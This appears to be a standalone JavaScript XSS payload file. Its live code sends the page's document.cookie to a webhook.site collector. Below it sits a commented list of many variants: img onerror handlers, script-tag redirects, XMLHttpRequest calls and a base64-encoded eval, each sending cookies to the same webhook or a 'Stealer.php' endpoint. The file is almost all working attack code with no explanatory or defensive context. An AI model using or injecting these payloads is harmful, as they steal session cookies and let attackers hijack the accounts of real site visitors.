// alert(document.cookie);
var i=new Image;
i.src="https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?"+document.cookie;


// function xssPayload() {
//   document.location="https://hailxss.xss.ht";
//   const alertMsg = 'xss ' + document.location;
//   console.log(alertMsg);
//   window.prompt(alertMsg);
// }

// console.log('XSS payload executed');
// xssPayload();


// <img src=x onerror=this.src="https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?c="+document.cookie>
// <img src=x onerror="location.href='https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?c='+ document.cookie">
// <script>new Image().src="https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?c="+encodeURI(document.cookie);</script>
// <script>new Audio().src="https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?c="+escape(document.cookie);</script>
// <script>location.href = 'https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/Stealer.php?cookie='+document.cookie</script>
// <script>location = 'https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/Stealer.php?cookie='+document.cookie</script>
// <script>document.location = 'https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/Stealer.php?cookie='+document.cookie</script>
// <script>document.location.href = 'https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/Stealer.php?cookie='+document.cookie</script>
// <script>document.write('<img src="https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293?c='+document.cookie+'" />')</script>
// <script>window.location.assign('https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/Stealer.php?cookie='+document.cookie)</script>
// <script>window['location']['assign']('https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/Stealer.php?cookie='+document.cookie)</script>
// <script>window['location']['href']('https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/Stealer.php?cookie='+document.cookie)</script>
// <script>document.location=["https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293?c",document.cookie].join()</script>
// <script>var i=new Image();i.src="https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?c="+document.cookie</script>
// <script>window.location="https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?c=".concat(document.cookie)</script>
// <script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?c="%2Bdocument.cookie, true);xhttp.send();</script>
// <script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
